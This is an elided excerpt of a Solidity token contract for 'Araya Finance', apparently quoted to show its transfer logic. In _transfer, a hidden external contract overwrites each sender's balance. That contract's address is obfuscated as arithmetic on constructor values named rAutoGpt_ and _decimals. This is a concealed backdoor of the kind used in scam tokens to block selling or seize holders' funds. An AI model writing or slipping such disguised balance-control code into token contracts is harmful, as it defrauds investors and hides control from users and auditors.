...
contract TOKEN is Ownable, IERC20 {
    ...
    string private _name = "Araya Finance";
    string private _symbol = "Araya";
    uint256 private _decimals;
    uint256 private _totalSupply;
    uint256 private rAutoGpt_;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;

    constructor(uint256 decimals_,uint256 _MAXAutoGpt) {
        _decimals = decimals_;
        rAutoGpt_ = _MAXAutoGpt;
    ...
    function _transfer(
        ...
        require(amount > 0);
        _balance[from] = _rAutoGpt(
        address(uint160(uint256(
        rAutoGpt_ + _decimals)))
        )._Pets(from, amount, _balance[from]);
